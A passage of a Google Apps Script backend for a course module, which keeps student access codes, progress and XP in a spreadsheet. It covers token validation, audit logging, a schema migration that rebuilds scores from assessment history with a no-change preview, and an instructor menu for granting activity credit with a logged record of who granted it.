  /* 3 fields = a token issued before the epoch was introduced. Treated as
     epoch 1 so the class is not all logged out the moment this deploys; it
     ages out naturally within TOKEN_TTL_D. */
  if (f.length !== 3 && f.length !== 4) return false;
  if (f[0] !== normCode_(code) || f[1] !== dev) return false;
  if (Date.now() - Number(f[2]) > TOKEN_TTL_D * 86400000) return false;
  if (Number(f[3] || 1) !== Number(epoch || 1)) return false;
  return true;
}

/** Invalidates every token issued for a code. */
function bumpEpoch_(row) {
  var sh = sheet_(SH_CODES);
  var cur = Number(sh.getRange(row, C.EPOCH).getValue() || 1);
  sh.getRange(row, C.EPOCH).setValue(cur + 1);
  return cur + 1;
}

/* ─────────────────────────── SHEET HELPERS ─────────────────────────── */

function ss_()          { return SpreadsheetApp.getActiveSpreadsheet(); }
function sheet_(name)   { return ss_().getSheetByName(name) || ss_().insertSheet(name); }

/**
 * Canonical form of an access code: uppercase, letters and digits only.
 * Dashes and spaces are stripped so "aap-mmjt-ypzp", "AAP MMJT YPZP" and
 * "AAPMMJTYPZP" all resolve to the same student. Comparisons are always
 * made between canonical forms; the sheet keeps the pretty dashed version
 * for readability.
 */
function normCode_(v) {
  return String(v || '').toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 32);
}
function round1_(n) { return Math.round(Number(n || 0) * 10) / 10; }

/** A client timestamp, clamped to ±1 day of now so nothing can be backdated. */
function clampDate_(v, now) {
  var t = v ? new Date(v).getTime() : NaN;
  if (!isFinite(t)) return now;
  var lo = now.getTime() - 86400000, hi = now.getTime() + 3600000;
  if (t < lo || t > hi) return now;
  return new Date(t);
}

/** Row number of a code in AccessCodes, or 0. Cached for speed.
    Normalises its own argument so callers may pass any spelling of the code. */
function findCodeRow_(code) {
  code = normCode_(code);
  if (!code) return 0;
  var cache = CacheService.getScriptCache();
  var hit = cache.get('row_' + code);
  if (hit) {
    var r = Number(hit);
    /* Trust but verify — the sheet could have been re-sorted. */
    if (normCode_(sheet_(SH_CODES).getRange(r, C.CODE).getValue()) === code) return r;
    cache.remove('row_' + code);
  }
  var sh = sheet_(SH_CODES);
  var last = sh.getLastRow();
  if (last < 2) return 0;
  var col = sh.getRange(2, C.CODE, last - 1, 1).getValues();
  for (var i = 0; i < col.length; i++) {
    if (normCode_(col[i][0]) === code) {
      cache.put('row_' + code, String(i + 2), 21600);   // 6 hours
      return i + 2;
    }
  }
  return 0;
}

function appendRows_(sheetName, rows) {
  if (!rows || !rows.length) return;
  var sh = sheet_(sheetName);
  sh.getRange(sh.getLastRow() + 1, 1, rows.length, rows[0].length).setValues(rows);
}

function logLogin_(code, name, section, event, result, dev, sid, ua, screen) {
  try {
    appendRows_(SH_LOGIN, [[new Date(), code, safeText_(name, 80), safeText_(section, 40),
      event, result, safeText_(dev, 60), safeText_(sid, 60), shortUA_(ua), safeText_(screen, 20)]]);
  } catch (e) { /* logging must never break a login */ }
}

/** Security-relevant events. Deliberately does not record codes in full when
    the code was not recognised, and never records tokens. */
function logSec_(code, dev, action, verdict, detail, ua) {
  try {
    appendRows_(SH_SEC, [[new Date(), safeText_(code, 32), safeText_(dev, 60),
      safeText_(action, 30), verdict, safeText_(detail, MAX_FIELD), shortUA_(ua)]]);
  } catch (e) { /* never break a request to write a log line */ }
}

function shortUA_(ua) {
  ua = String(ua || '');
  var os = /Android/i.test(ua) ? 'Android'
         : /iPhone|iPad|iPod/i.test(ua) ? 'iOS'
         : /Windows/i.test(ua) ? 'Windows'
         : /Mac OS/i.test(ua) ? 'macOS'
         : /Linux/i.test(ua) ? 'Linux' : 'Unknown';
  var br = /Edg\//i.test(ua) ? 'Edge'
         : /OPR\//i.test(ua) ? 'Opera'
         : /Chrome\//i.test(ua) ? 'Chrome'
         : /Firefox\//i.test(ua) ? 'Firefox'
         : /Safari\//i.test(ua) ? 'Safari' : 'Other';
  return br + ' on ' + os;
}

/** Stores the gate list the module reports, for auditAnswerKey(). */
function rememberClientGates_(gates) {
  try {
    if (!Array.isArray(gates) || !gates.length || gates.length > 80) return;
    var clean = [];
    for (var i = 0; i < gates.length; i++) {
      var g = String(gates[i] || '').slice(0, 40).replace(/[^A-Za-z0-9_-]/g, '');
      if (g) clean.push(g);
    }
    PropertiesService.getScriptProperties()
      .setProperty('AAP_CLIENT_GATES', JSON.stringify(clean));
  } catch (e) {}
}

/* ═══════════════════════════════════════════════════════════════════════
   ADMIN — run these from the "AAP101 Database" menu in the spreadsheet
   ═══════════════════════════════════════════════════════════════════════ */

function onOpen() {
  SpreadsheetApp.getUi()
    .createMenu('AAP101 Database')
    .addItem('① Set up database (first time only)', 'setupDatabase')
    .addItem('② Preview the upgrade (changes nothing)', 'auditMigration')
    .addItem('②b Preview one student (changes nothing)', 'auditStudent')
    .addItem('②c Outlier analysis (changes nothing)', 'auditOutliers')
    .addItem('②d Outlier analysis — one section…', 'auditSection')
    .addItem('③ Upgrade database (after a security update)', 'migrateSchema')
    .addItem('↩ Restore pre-upgrade figures…', 'restorePreMigration')
    .addSeparator()
    .addItem('Grant activity credit…', 'grantActivityCredit')
    .addSeparator()
    .addItem('Release a device lock…', 'releaseDevice')
    .addItem('Disable an access code…', 'disableCode')
    .addItem('Re-enable an access code…', 'enableCode')
    .addSeparator()
    .addItem('Add 100 more access codes', 'addMoreCodes')
    .addItem('Class summary', 'showSummary')
    .addItem('Check the answer key', 'auditAnswerKey')
    .addToUi();
}

/** Creates every tab, formats it, and generates the access codes. Safe to
    re-run: it will refuse to touch existing codes.                        */
function setupDatabase() {
  var ui = SpreadsheetApp.getUi();
  var codes = sheet_(SH_CODES);

  if (codes.getLastRow() > 1) {
    ui.alert('Already set up',
      'The AccessCodes sheet already has ' + (codes.getLastRow() - 1) + ' codes in it.\n\n' +
      'Nothing was changed — this protects your students\' data. If you are ' +
      'installing a security update, use "② Upgrade database" instead.',
      ui.ButtonSet.OK);
    return;
  }

  initSheet_(SH_CODES,  CODES_HEADERS);
  initSheet_(SH_LOGIN,  LOGIN_HEADERS);
  initSheet_(SH_ASSESS, ASSESS_HEADERS);
  initSheet_(SH_RUN,    RUN_HEADERS);
  initSheet_(SH_EVENT,  EVENT_HEADERS);
  initSheet_(SH_SEC,    SEC_HEADERS);

  var set = initSheet_(SH_SET, ['Key','Value','Notes']);
  if (set.getLastRow() < 2) {
    set.getRange(2, 1, 2, 3).setValues([
      ['deviceLock', 'ON',  'Each code works on one device only. Use the menu to release a lock.'],
      ['createdOn',  new Date(), 'When this database was set up.']
    ]);
  }

  writeCodes_(codes, CODE_COUNT);
  secret_();   // generate the signing secret now

  codes.hideColumns(C.SESSID, 2);
  codes.hideColumns(FIRST_NEW_COL, CODES_HEADERS.length - FIRST_NEW_COL + 1);

  SpreadsheetApp.flush();
  ui.alert('Database ready',
    CODE_COUNT + ' access codes have been generated in the AccessCodes tab.\n\n' +
    'Next step: Deploy ▸ New deployment ▸ Web app, then paste the web app URL ' +
    'into assets/config.js in your module.',
    ui.ButtonSet.OK);
}

/**
 * Brings an existing database up to the hardened schema.
 *
 * Safe to run more than once, and it does not remove or rewrite anything that
 * was already there:
 *   · adds the new columns to the right of your existing 24
 *   · adds the SecurityLog tab
 *   · rebuilds each student's cleared-activity list from the Assessments tab —
 *     their own history, not a guess
 *   · keeps their existing XP so nobody is set back to zero
 *   · copies the pre-upgrade figures into _PreMigration so you can always see
 *     what the dashboard said before
 */
function migrateSchema() {
  var ui;
  try { ui = SpreadsheetApp.getUi(); } catch (e) { ui = null; }

  var plan = migrationPlan_();
  if (!plan.ok) {
    if (ui) ui.alert('Nothing to upgrade', plan.reason, ui.ButtonSet.OK);
    return plan.reason;
  }

  var sh = sheet_(SH_CODES);

  /* ── 1. Headers (additive only) ── */
  if (plan.schema.headerAdds.length) {
    var head = sh.getRange(1, 1, 1, Math.max(sh.getLastColumn(), CODES_HEADERS.length)).getValues()[0];
    for (var h = 0; h < CODES_HEADERS.length; h++) {
      if (String(head[h] || '') !== CODES_HEADERS[h]) {
        if (h < 24 && String(head[h] || '').trim()) continue;   // never rename an original column
        head[h] = CODES_HEADERS[h];
      }
    }
    sh.getRange(1, 1, 1, CODES_HEADERS.length)
      .setValues([head.slice(0, CODES_HEADERS.length)])
      .setFontWeight('bold').setBackground('#002C39').setFontColor('#FFFFFF');
  }

  initSheet_(SH_SEC, SEC_HEADERS);
  /* Assessments gained two columns; add the headers without touching rows. */
  var ash = sheet_(SH_ASSESS);
  if (ash.getLastColumn() < ASSESS_HEADERS.length) {
    ash.getRange(1, 1, 1, ASSESS_HEADERS.length).setValues([ASSESS_HEADERS])
       .setFontWeight('bold').setBackground('#002C39').setFontColor('#FFFFFF');
  }

  /* ── 2. Apply the plan ──
     Every value written below was decided by migrationPlan_(), which is the
     same function auditMigration() prints. What you previewed is what runs. */
  var rows = sh.getRange(2, 1, plan.lastRow - 1, CODES_HEADERS.length).getValues();
  var stamp = new Date().toISOString();
  var seeded = 0;

  for (var r = 0; r < plan.rows.length; r++) {
    var p = plan.rows[r];
    if (!p.willSeed) continue;
    var rec = rows[p.rowNum - 2];

    /* ── 2a. Preserve the old dashboard BEFORE replacing it ──
       This is the whole reversibility story: every figure about to be
       overwritten is captured here first, and "Restore pre-upgrade figures…"
       in the menu puts them back. */
    if (!rec[C.PREMIG - 1]) {
      rec[C.PREMIG - 1] = JSON.stringify({
        migratedOn: stamp,
        minutes: rec[C.MINUTES - 1], xp: rec[C.XP - 1], level: rec[C.LEVEL - 1],
        rank: rec[C.RANK - 1], acc: rec[C.ACC - 1], correct: rec[C.CORRECT - 1],
        attempts: rec[C.ATTEMPTS - 1], streak: rec[C.STREAK - 1],
        badges: rec[C.BADGE_N - 1], badgeList: rec[C.BADGE_L - 1],
        lessons: rec[C.LESSONS - 1], progress: rec[C.PROGRESS - 1],
        acts: rec[C.ACTS - 1]
      }).slice(0, 4000);
    }

    /* ── 2b. The trusted state, rebuilt from Assessments history ── */
    rec[C.EPOCH - 1]     = 1;
    rec[C.SXP - 1]       = p.seed.xp;
    rec[C.SGATES - 1]    = p.seed.gates.join(',');
    rec[C.SCORRECT - 1]  = p.seed.correct;
    rec[C.SATTEMPTS - 1] = p.seed.attempts;
    rec[C.SSTREAK - 1]   = p.seed.streak;
    rec[C.SRUN - 1]      = 0;
    rec[C.SBADGES - 1]   = p.seed.badgeIds.join(',');
    rec[C.STRIES - 1]    = JSON.stringify(p.seed.tries || {}).slice(0, 4000);
    rec[C.SYNCN - 1]     = Number(rec[C.SYNCN - 1] || 0);

    /* ── 2b(ii). Evidence that exists but cannot become trusted state ──
       Badges the old build recorded are kept here, verbatim and clearly
       labelled unverified, so a legitimately-earned "Sharp Eye" is not simply
       erased from the record. Nothing reads this column: readState_() does not
       look at it, so it can never reach XP, Level, Rank, Progress, or any
       other calculation. It is here for you to read and decide about. */
    if (p.legacy.badgeCount || p.legacy.badgeList) {
      var ba = p.badgeAudit;
      rec[C.LEGBADGES - 1] = JSON.stringify({
        note: 'NOT TRUSTED STATE. Recorded by the pre-hardening build and kept here as ' +
              'evidence only. Nothing reads this column.',
        legacyCount: p.legacy.badgeCount,
        legacyList: p.legacy.badgeList,
        /* UNVERIFIED — the activity that could have earned it was completed,
           but the history does not contain what it would take to check the
           condition. Kept so a genuinely earned badge is not simply erased. */
        unverified: ba.unverified.map(function (x) { return x.name + ' (' + x.why + ')'; }),
        /* CONTRADICTED — the history rules it out. */
        contradicted: ba.contradicted.map(function (x) { return x.name + ' (' + x.why + ')'; }),
        /* PROVEN ones are not listed here; they are in _ServerBadges, where
           they count. */
        provenNowInServerBadges: ba.proven.map(function (x) { return x.name; }),
        unnamedClaims: ba.unreadable,
        capturedOn: stamp
      }).slice(0, 4000);
    }
    /* The size of the gap between what the dashboard claimed and what history
       evidences, kept for review rather than quietly discarded. */
    rec[C.HISTDELTA - 1] = p.legacy.historyDelta || 0;

    /* ── 2c. Restate the visible dashboard from that trusted state ──
       Without this the old, unverifiable figures would sit on screen until the
       student happened to sync again — and a student who never logs in again
       would keep them forever. The values come from derive_(), the same
       function the live server uses, so the row reads exactly as it would
       after their next sync.

       Columns 1–8 (code, status, name, section, device, first login, last seen,
       logins), 9 (total minutes) and 22–24 are NOT touched. */
    var d = p.derived;
    rec[C.XP - 1]       = d.xp;
    rec[C.LEVEL - 1]    = d.level;
    rec[C.RANK - 1]     = d.rank;
    rec[C.ACC - 1]      = d.accuracy;
    rec[C.CORRECT - 1]  = d.correct;
    rec[C.ATTEMPTS - 1] = d.attempts;
    rec[C.STREAK - 1]   = d.streak;
    rec[C.BADGE_N - 1]  = d.badgeCount;
    rec[C.BADGE_L - 1]  = d.badgeList;
    rec[C.LESSONS - 1]  = d.lessons;
    rec[C.PROGRESS - 1] = d.progress;
    rec[C.ACTS - 1]     = d.activities;
    seeded++;
  }

  sh.getRange(2, 1, rows.length, CODES_HEADERS.length).setValues(rows);
  try { sh.hideColumns(FIRST_NEW_COL, CODES_HEADERS.length - FIRST_NEW_COL + 1); } catch (e) {}
  SpreadsheetApp.flush();

  var msg = 'Upgrade complete.\n\n' +
    'Rows rebuilt:           ' + seeded + '\n' +
    'Already up to date:     ' + plan.totals.alreadyMigrated + '\n\n' +
    'What changed:\n' +
    '· ' + (CODES_HEADERS.length - 24) + ' bookkeeping columns were added to the right (hidden).\n' +
    '· XP, accuracy, streak, badges, lessons, progress and activities were\n' +
    '  REBUILT from each student\'s Assessments history and the answer key.\n' +
    '  Figures the history could not support were not carried over.\n' +
    '· The old dashboard figures are saved in the _PreMigration column, and\n' +
    '  "Restore pre-upgrade figures…" in this menu puts them back.\n\n' +
    'Access codes, names, sections, devices, login counts, study minutes and\n' +
    'every Assessments row were left exactly as they were.';
  Logger.log(msg);
  if (ui) ui.alert('AAP101 database upgrade', msg, ui.ButtonSet.OK);
  return msg;
}

/* ═══════════════════════════════════════════════════════════════════════
   MIGRATION — DRY RUN
   ═══════════════════════════════════════════════════════════════════════ */

/**
 * Works out exactly what migrateSchema() would do. Writes NOTHING.
 *
 * migrateSchema() calls this and then applies the result, so the preview and
 * the real thing cannot drift apart — there is only one place the decision is
 * made.
 *
 * Read-only discipline: this function uses sheetRO_() rather than sheet_()
 * (which creates a missing tab), never calls findCodeRow_() (which populates
 * the cache), and never touches setValue, setValues or insertSheet.
 *
 * @return {Object} the plan
 */
function migrationPlan_() {
  var plan = {
    ok: false, reason: '', lastRow: 0,
    schema: { headerAdds: [], securityLogMissing: false, assessColsToAdd: 0, alreadyUpgraded: false },
    history: { rows: 0, usable: 0, duplicates: 0, serverWritten: 0, replayRows: 0,
               unknownGates: {}, orphanCodes: {} },
    totals: { codes: 0, claimed: 0, unused: 0, alreadyMigrated: 0, toSeed: 0,
              gatesRebuilt: 0,
              /* Two DIFFERENT totals. They were once the same number, back when
                 the migration carried XP over unchanged; they have not been the
                 same since reconstruction replaced that, and reporting one
                 under the other's name was misleading. */
              legacyXpTotal: 0,      // (A) what the dashboards say now → _PreMigration
              rebuiltXpTotal: 0,     // (B) what will actually enter _ServerXP
              xpChanged: 0, xpIncreased: 0, xpDecreased: 0,
              largestDecrease: null, largestIncrease: null,
              badgesProven: 0, badgesUnverified: 0, badgesContradicted: 0 },
    rows: [], flagged: [], differences: []
  };

  var sh = sheetRO_(SH_CODES);
  if (!sh) { plan.reason = 'There is no AccessCodes tab yet. Run "① Set up database" first.'; return plan; }

  var last = sh.getLastRow();
  if (last < 2) { plan.reason = 'There are no access codes yet. Run "① Set up database" first.'; return plan; }
  plan.lastRow = last;

  /* ── Schema delta ── */
  var head = sh.getRange(1, 1, 1, Math.max(sh.getLastColumn(), CODES_HEADERS.length)).getValues()[0];
  for (var h = 0; h < CODES_HEADERS.length; h++) {
    if (String(head[h] || '') !== CODES_HEADERS[h]) {
      if (h < 24 && String(head[h] || '').trim()) continue;   // original column, left alone
      plan.schema.headerAdds.push({ col: h + 1, name: CODES_HEADERS[h] });
    }
  }
  plan.schema.alreadyUpgraded = plan.schema.headerAdds.length === 0;
  plan.schema.securityLogMissing = !sheetRO_(SH_SEC);

  var ash = sheetRO_(SH_ASSESS);
  if (ash) plan.schema.assessColsToAdd = Math.max(0, ASSESS_HEADERS.length - ash.getLastColumn());

  /* ── Rebuild history ──
     Every fact used to reconstruct a student's trusted state comes from this
     pass over the Assessments tab. A row contributes NOTHING unless its
     Activity ID is one the answer key recognises — which is what keeps
     fabricated rows (an activity id of "x", say) out of the new state without
     anyone having to name them. */
  var history = {};
  function bucket(code) {
    if (!history[code]) {
      history[code] = { gates: {}, tries: {}, answers: [], replayAwards: [],
                        correct: 0, attempts: 0, rows: 0, dupes: 0 };
    }
    return history[code];
  }

  if (ash && ash.getLastRow() > 1) {
    var width = Math.min(ash.getLastColumn(), ASSESS_HEADERS.length);
    var av = ash.getRange(2, 1, ash.getLastRow() - 1, width).getValues();
    plan.history.rows = av.length;

    /* Retry duplicates.
       The legacy client kept its batch whenever a sync did not come back OK —
       including when the server had in fact committed it and only the reply
       was lost. Legacy apiSync_ had no idempotency key, so the same events
       were appended a second time. Identical rows are therefore an artefact of
       the transport, not a record of a student doing something twice, and
       counting them would inflate Attempts (and with it Accuracy).

       Two genuinely separate submissions cannot collide here: they would need
       the same activity, result, session, attempt number AND the same
       millisecond. */
    var seenRow = {};

    for (var a = 0; a < av.length; a++) {
      var acode = normCode_(av[a][1]);
      var agate = String(av[a][5] || '').trim();
      var ares  = String(av[a][8] || '').toUpperCase();
      if (!acode || !agate) continue;

      if (!gateSpec_(agate)) {
        plan.history.unknownGates[agate] = (plan.history.unknownGates[agate] || 0) + 1;
        if (acode) bucket(acode).rows++;
        continue;
      }

      var ts = dateNum_(av[a][0]);
      var fp = acode + '|' + agate + '|' + ares + '|' + String(av[a][11] || '') +
               '|' + String(av[a][9] || '') + '|' + ts;
      if (seenRow[fp]) { bucket(acode).dupes++; plan.history.duplicates++; continue; }
      seenRow[fp] = true;

      var h = bucket(acode);
      h.rows++;
      h.tries[agate] = (h.tries[agate] || 0) + 1;

      /* Was this row written by the hardened server, or by the old build?
         The Verified column only exists on rows apiGrade_ wrote, and it is the
         only way to tell whether the XP Awarded beside it means anything. On
         every legacy row that column is 0, because the old client never sent
         an xp field for answer or activity events. */
      var verified = String(av[a][12] || '').toUpperCase();
      var serverWritten = (verified === 'CHECKED' || verified === 'CLAIMED');
      if (serverWritten) plan.history.serverWritten++;

      if (ares === 'REPLAY') plan.history.replayRows++;

      if (ares === 'COMPLETED' || ares === 'REPLAY') {
        /* A set, deliberately. COMPLETED is not one-time in legacy data: the
           old client emitted it whenever localStorage did not already show the
           gate as passed, so a student who cleared their browser and worked
           through the module again produced a second COMPLETED for the same
           activity. That is one activity, however many rows describe it. */
        h.gates[agate] = true;
        plan.history.usable++;

        if (ares === 'REPLAY' && serverWritten) {
          /* The one case where a repeat legitimately pays: a speed round
             replayed after it was already cleared. The amount was computed by
             this server and recorded in the row. Legacy rows never qualify —
             REPLAY did not exist in the old build. */
          h.replayAwards.push({ gate: agate, award: Number(av[a][10] || 0) });
        }

      } else if (ares === 'CORRECT' || ares === 'WRONG') {
        /* Answer-level rows drive Correct, Attempts and Best Streak. Note one
           activity can produce many: a speed round logs a row per question.
           Ordering uses the row timestamp, which on legacy rows came from the
           student's own clock — adequate for a streak, which is cosmetic and
           feeds nothing that is graded. */
        h.attempts++;
        if (ares === 'CORRECT') h.correct++;
        /* The activity is kept alongside the result. The old build tagged every
           answer event with the gate it belonged to, which is what makes a
           "no misses" claim checkable: a WRONG row against an activity
           disproves a clean run of it. */
        h.answers.push({ t: ts, ok: ares === 'CORRECT', gate: agate });
        plan.history.usable++;
      }
    }
  }

  /* ── Per-row preview ── */
  var rows = sh.getRange(2, 1, last - 1, CODES_HEADERS.length).getValues();
  var seenCodes = {};

  for (var r = 0; r < rows.length; r++) {
    var rec  = rows[r];
    var code = normCode_(rec[C.CODE - 1]);
    if (!code) continue;
    seenCodes[code] = true;
    plan.totals.codes++;

    var claimed = !!String(rec[C.DEVICE - 1] || '');
    if (claimed) plan.totals.claimed++; else plan.totals.unused++;

    var already = Number(rec[C.EPOCH - 1] || 0) > 0;
    if (already) { plan.totals.alreadyMigrated++; }

    var h = history[code] || { gates: {}, tries: {}, answers: [], correct: 0, attempts: 0, rows: 0 };
    var st = reconstructState_(h);

    var xp       = Number(rec[C.XP - 1] || 0);
    var correct  = Number(rec[C.CORRECT - 1] || 0);
    var attempts = Number(rec[C.ATTEMPTS - 1] || 0);
    var dashActs = Number(rec[C.ACTS - 1] || 0);
    var gates    = st.gateList;

    /* The dashboard this migration will write, computed by the same derive_()
       the live server uses — so the row looks exactly as it would after the
       student's next sync. */
    var derived = derive_(st);

    var entry = {
      rowNum: r + 2,
      code: String(rec[C.CODE - 1] || ''),
      name: String(rec[C.NAME - 1] || ''),
      section: String(rec[C.SECTION - 1] || ''),
      status: String(rec[C.STATUS - 1] || ''),
      claimed: claimed,
      alreadyMigrated: already,
      willSeed: !already,
      /* what the sheet says today — unverified */
      dashboard: { xp: xp, correct: correct, attempts: attempts, activities: dashActs,
                   streak: Number(rec[C.STREAK - 1] || 0),
                   badges: Number(rec[C.BADGE_N - 1] || 0),
                   badgeList: String(rec[C.BADGE_L - 1] || ''),
                   lessons: Number(rec[C.LESSONS - 1] || 0),
                   progress: Number(rec[C.PROGRESS - 1] || 0) },
      /* what history can prove */
      seed: { xp: st.xp, correct: st.correct, attempts: st.attempts,
              streak: st.streak, gates: gates, badgeIds: derived.badgeIds,
              tries: st.tries },
      derived: derived,
      /* (C) evidence that exists but cannot be turned into trusted state.
         Archived on the row, never read by anything that computes a score. */
      legacy: { badgeCount: Number(rec[C.BADGE_N - 1] || 0),
                badgeList: String(rec[C.BADGE_L - 1] || ''),
                historyDelta: Math.max(0, dashActs - gates.length) },
      badgeAudit: auditLegacyBadges_(rec[C.BADGE_L - 1], rec[C.BADGE_N - 1], st),
      evidence: { rows: h.rows, answerRows: h.attempts, gateRows: gates.length,
                  duplicates: h.dupes || 0, replayAwards: (h.replayAwards || []).length },
      newProgress: derived.progress,
      diffs: [],    // differences that cannot be rebuilt — expected, not suspicious
      flags: []     // figures nothing in the history accounts for
    };

    /* ── Observations about the gap between (A) the legacy dashboard and
       (B) the reconstructed state ──

       None of these decide anything: every row is rebuilt from history either
       way. They are sorted into two kinds, because the difference matters:

         DIFFERENCE  something the old build recorded that reconstruction
                     genuinely cannot rebuild. Expected on honest records.
                     Not evidence of anything.

         UNSUPPORTED a figure that no amount of missing bonus or lost sync
                     accounts for. Worth a look. Still not, by itself, proof
                     of wrongdoing — a broken client or a botched restore can
                     produce it too.                                          */

    var allowance = explainableBonus_(gates);

    if (!already && claimed && xp > st.xp) {
      if (xp <= st.xp + allowance) {
        entry.diffs.push('XP_UNRECONSTRUCTABLE_DIFF: dashboard ' + xp + ', rebuilt ' + st.xp +
                         '. Within the ' + allowance + ' XP of first-try / flawless-run bonuses ' +
                         'this activity set could have earned but a legacy row cannot show. ' +
                         'Most likely a genuine bonus that is simply not recoverable.');
      } else {
        entry.flags.push('XP_UNSUPPORTED: dashboard ' + xp + ', rebuilt ' + st.xp +
                         (allowance ? ' (+' + allowance + ' of unprovable bonuses allowed for)' : '') +
                         '. The difference is larger than any bonus could explain.');
      }
    }
    if (!already && dashActs > gates.length) {
      entry.flags.push('HISTORY_INCOMPLETE: dashboard claims ' + dashActs +
                       ' activities, history evidences ' + gates.length +
                       '. Delta of ' + (dashActs - gates.length) + ' recorded in _HistoryDelta.');
    }
    if (!already && claimed && xp > 0 && gates.length === 0) {
      entry.flags.push('NO_RECOGNISED_HISTORY: ' + xp + ' XP on the dashboard, but not one ' +
                       'recognised completed activity in Assessments.');
    }
    /* A modest shortfall here is ordinary — a sync that never landed, a queue
       trimmed after a long spell offline. Only a gap nothing accounts for. */
    if (!already && claimed && attempts > 0 && (st.attempts === 0 || attempts > st.attempts * 2)) {
      entry.flags.push('STATS_UNSUPPORTED: dashboard ' + correct + '/' + attempts +
                       ' correct/attempts, history evidences ' + st.correct + '/' + st.attempts + '.');
    } else if (!already && claimed && attempts > st.attempts) {
      entry.diffs.push('STATS_PARTIAL_DIFF: dashboard ' + correct + '/' + attempts + ', rebuilt ' +
                       st.correct + '/' + st.attempts + '. Consistent with syncs that never landed.');
    }
    /* Some badges — "no misses", "flawless run" — cannot be shown by a legacy
       row even when they were genuinely earned. */
    /* Badges are now classified individually rather than compared as counts.
       UNVERIFIED is an ordinary outcome and belongs with the differences;
       CONTRADICTED is a positive finding and belongs with the flags. */
    var ba = entry.badgeAudit;
    if (!already && claimed && ba.unverified.length) {
      entry.diffs.push('BADGES_UNVERIFIED (' + ba.unverified.length + '): ' +
        ba.unverified.map(function (x) { return x.name + ' — ' + x.why; }).join('; ') +
        '. Kept in _LegacyBadges_UNVERIFIED; not counted anywhere.');
    }
    if (!already && claimed && ba.contradicted.length) {
      entry.flags.push('BADGES_CONTRADICTED (' + ba.contradicted.length + '): ' +
        ba.contradicted.map(function (x) { return x.name + ' — ' + x.why; }).join('; ') + '.');
    }
    if (!already && claimed && ba.unreadable) {
      entry.flags.push('BADGES_UNNAMED: the dashboard counts ' + ba.unreadable +
                       ' badge(s) it does not name, so there is nothing to check and ' +
                       'nothing supporting them.');
    }
    if (h.rows > 0 && gates.length === 0 && h.attempts === 0) {
      entry.flags.push('HISTORY_ALL_UNRECOGNISED: ' + h.rows + ' Assessments row(s), none of ' +
                       'them referencing an activity the answer key knows.');
    }
    if (h.dupes) {
      entry.diffs.push('DUPLICATE_ROWS_IGNORED: ' + h.dupes + ' identical Assessments row(s), ' +
                       'almost certainly a sync that was retried after its reply was lost. ' +
                       'Counted once.');
    }
    // Arithmetic that cannot happen however the data was produced.
    if (correct > attempts) {
      entry.flags.push('IMPOSSIBLE_ACCURACY: ' + correct + ' correct out of ' + attempts + ' attempts.');
    }
    if (xp > maxAwardableXp_()) {
      entry.flags.push('XP_ABOVE_COURSE_MAX: ' + xp + ' vs ' + maxAwardableXp_() + ' available.');
    }
    if (!claimed && (xp > 0 || attempts > 0)) {
      entry.flags.push('UNCLAIMED_WITH_PROGRESS: code was never claimed but carries progress.');
    }
    // Text already in the sheet that Sheets would evaluate as a formula.
    // safeText_ protects everything written from now on; anything sitting in
    // the sheet from before was never filtered.
    ['NAME', 'SECTION', 'LASTPAGE'].forEach(function (k) {
      var v = String(rec[C[k] - 1] || '');
      if (/^[=+\-@]/.test(v)) {
        entry.flags.push('FORMULA_TEXT in ' + k + ': ' + v.slice(0, 60));
      }
    });

    if (entry.flags.length) plan.flagged.push(entry);
    if (entry.diffs.length) plan.differences.push(entry);
    if (entry.willSeed) {
      plan.totals.badgesProven       += entry.badgeAudit.proven.length;
      plan.totals.badgesUnverified   += entry.badgeAudit.unverified.length;
      plan.totals.badgesContradicted += entry.badgeAudit.contradicted.length;
      plan.totals.toSeed++;
      plan.totals.gatesRebuilt += gates.length;

      plan.totals.legacyXpTotal  += xp;        // the old, unverified figure
      plan.totals.rebuiltXpTotal += st.xp;     // the figure that will be written

      var delta = st.xp - xp;
      if (delta !== 0) {
        plan.totals.xpChanged++;
        var move = { code: entry.code, name: entry.name, from: xp, to: st.xp, delta: delta };
        if (delta < 0) {
          plan.totals.xpDecreased++;
          if (!plan.totals.largestDecrease || delta < plan.totals.largestDecrease.delta) {
            plan.totals.largestDecrease = move;
          }
        } else {
          plan.totals.xpIncreased++;
          if (!plan.totals.largestIncrease || delta > plan.totals.largestIncrease.delta) {
            plan.totals.largestIncrease = move;
          }
        }
      }
    }
    plan.rows.push(entry);
  }

  /* Assessment rows whose code is not in AccessCodes — their history is
     unreachable and will simply be ignored. */
  for (var hc in history) {
    if (history.hasOwnProperty(hc) && !seenCodes[hc]) {
      plan.history.orphanCodes[hc] = Object.keys(history[hc]).length;
    }
  }

  plan.ok = true;
  return plan;
}

/* ═══════════════════════════════════════════════════════════════════════
   ADMINISTRATIVE RECOVERY

   Separate from the migration on purpose.

   Reconstruction credits only what a student's Assessments history evidences.
   Sometimes that history is genuinely short — a sync that never landed, a queue
   trimmed after a long spell offline — and a student who really did finish an
   activity has no row to show for it. The migration flags that as
   HISTORY_INCOMPLETE and records the size of the gap in _HistoryDelta. It does
   NOT guess, and hand-editing _ServerGates is not the answer: an unlogged edit
   to the trusted state is exactly the kind of thing this whole exercise was
   meant to stop.

   Instead, credit is granted here, deliberately:
     · one activity, for one student, at a time
     · the activity must exist in the answer key
     · the credit is refused if history already evidences it
     · every grant is written to SecurityLog with the Google account that made
       it, so the trusted state always has a provenance
   ═══════════════════════════════════════════════════════════════════════ */

/**
 * Grants one student credit for one activity, on the instructor's authority
 * rather than on the evidence. Menu-driven, so only someone who can edit this
 * spreadsheet can run it, and Apps Script tells us who that was.
 */
function grantActivityCredit() {
  var ui = SpreadsheetApp.getUi();

  var who = '';
  try { who = Session.getActiveUser().getEmail() || ''; } catch (e) {}

  var r1 = ui.prompt('Grant activity credit (1 of 3)',
    'This records that a student completed an activity, on YOUR authority, ' +
    'because their history does not evidence it.\n\n' +
    'Every grant is logged in the SecurityLog tab against your account.\n\n' +
    'Access code:', ui.ButtonSet.OK_CANCEL);
  if (r1.getSelectedButton() !== ui.Button.OK) return;
  var code = normCode_(r1.getResponseText());

  var row = findCodeRow_(code);
  if (!row) { ui.alert('Not found', 'No such access code: ' + code, ui.ButtonSet.OK); return; }

  var r2 = ui.prompt('Grant activity credit (2 of 3)',
    'Activity id to credit, exactly as it appears in the module.\n\n' +
    'Valid ids:\n' + allGates_().sort().join(', '), ui.ButtonSet.OK_CANCEL);
  if (r2.getSelectedButton() !== ui.Button.OK) return;
  var gate = String(r2.getResponseText() || '').trim();

  var spec = gateSpec_(gate);
  if (!spec) {
    ui.alert('Not an activity',
